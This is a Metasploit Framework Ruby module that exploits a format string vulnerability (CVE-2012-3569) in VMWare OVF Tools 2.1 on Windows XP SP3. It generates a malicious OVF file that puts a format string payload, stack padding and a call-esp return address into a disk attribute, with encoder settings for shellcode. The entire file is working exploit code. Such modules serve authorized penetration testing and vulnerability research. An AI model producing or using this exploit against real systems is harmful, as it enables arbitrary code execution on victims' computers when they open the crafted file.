# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::FILEFORMAT

	def initialize(info = {})
		super(update_info(info,
			&#039;Name&#039;           => &#039;VMWare OVF Tools Format String Vulnerability&#039;,
			&#039;Description&#039;    => %q{
					This module exploits a format string vulnerability in VMWare OVF Tools 2.1 for
				Windows. The vulnerability occurs when printing error messages while parsing a
				a malformed OVF file. The module has been tested successfully with VMWare OVF Tools
				2.1 on Windows XP SP3.
			},
			&#039;License&#039;        => MSF_LICENSE,
			&#039;Author&#039;         =>
				[
					&#039;Jeremy Brown&#039;, # Vulnerability discovery
					&#039;juan vazquez&#039;  # Metasploit Module
				],
			&#039;References&#039;     =>
				[
					[ &#039;CVE&#039;, &#039;2012-3569&#039; ],
					[ &#039;OSVDB&#039;, &#039;87117&#039; ],
					[ &#039;BID&#039;, &#039;56468&#039; ],
					[ &#039;URL&#039;, &#039;http://www.vmware.com/security/advisories/VMSA-2012-0015.html&#039; ]
				],
			&#039;Payload&#039;        =>
				{
					&#039;DisableNops&#039;    => true,
					&#039;BadChars&#039;       =>
						(0x00..0x08).to_a.pack("C*") +
						"\x0b\x0c\x0e\x0f" +
						(0x10..0x1f).to_a.pack("C*") +
						(0x80..0xff).to_a.pack("C*") +
						"\x22",
					&#039;StackAdjustment&#039; => -3500,
					&#039;PrependEncoder&#039; => "\x54\x59", # push esp # pop ecx
					&#039;EncoderOptions&#039; =>
						{
							&#039;BufferRegister&#039; => &#039;ECX&#039;,
							&#039;BufferOffset&#039; => 6
						}
				},
			&#039;Platform&#039;       => &#039;win&#039;,
			&#039;Targets&#039;        =>
				[
					# vmware-ovftool-2.1.0-467744-win-i386.msi
					[ &#039;VMWare OVF Tools 2.1 on Windows XP SP3&#039;,
						{
							&#039;Ret&#039; => 0x7852753d,  # call esp # MSVCR90.dll 9.00.30729.4148 installed with VMware OVF Tools 2.1
							&#039;AddrPops&#039; => 98,
							&#039;StackPadding&#039; => 38081,
							&#039;Alignment&#039; => 4096
						}
					],
				],
			&#039;Privileged&#039;     => false,
			&#039;DisclosureDate&#039; => &#039;Nov 08 2012&#039;,
			&#039;DefaultTarget&#039;  => 0))

		register_options(
			[
				OptString.new(&#039;FILENAME&#039;, [ true, &#039;The file name.&#039;,  &#039;msf.ovf&#039;]),
			], self.class)
	end

	def ovf
		my_payload = rand_text_alpha(4) # ebp
		my_payload << [target.ret].pack("V") # eip # call esp
		my_payload << payload.encoded

		fs = rand_text_alpha(target[&#039;StackPadding&#039;]) # Padding until address aligned to 0x10000 (for example 0x120000)
		fs << rand_text_alpha(target[&#039;Alignment&#039;]) # Align to 0x11000
		fs << my_payload
		# 65536 => 0x10000
		fs << rand_text_alpha(65536 - 27 - target[&#039;StackPadding&#039;] - target[&#039;Alignment&#039;] - my_payload.length - (target[&#039;AddrPops&#039;] * 8))
		fs << "%08x" * target[&#039;AddrPops&#039;] # Reach saved EBP
		fs << "%hn" # Overwrite LSW of saved EBP with 0x1000

		ovf_file = <<-EOF
<?xml version="1.0" encoding="UTF-8"?>
<Envelope vmw:buildId="build-162856" xmlns="http://schemas.dmtf.org/ovf/envelope/1"
xmlns:cim="http://schemas.dmtf.org/wbem/wscim/1/common"
xmlns:ovf="http://schemas.dmtf.org/ovf/envelope/1"
xmlns:rasd="http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/CIM_ResourceAllocationSettingData"
xmlns:vmw="http://www.vmware.com/schema/ovf"
xmlns:vssd="http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/CIM_VirtualSystemSettingData"
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
	<References>
		<File ovf:href="Small VM-disk1.vmdk" ovf:id="file1" ovf:size="68096" />
	</References>
	<DiskSection>
		<Info>Virtual disk information</Info>
		<Disk ovf:capacity="8" ovf:capacityAllocationUnits="#{fs}" ovf:diskId="vmdisk1" ovf:fileRef="file1" ovf:format="http://www.vmware.com/interfaces/specifications/vmdk.html#streamOptimized" />
	</DiskSection>
	<VirtualSystem ovf:id="Small VM">
		<Info>A virtual machine</Info>
	</VirtualSystem>
</Envelope>
		EOF
		ovf_file
	end

	def exploit
		print_status("Creating &#039;#{datastore[&#039;FILENAME&#039;]}&#039;. This files should be opened with VMMWare OVF 2.1")
		file_create(ovf)
	end
end

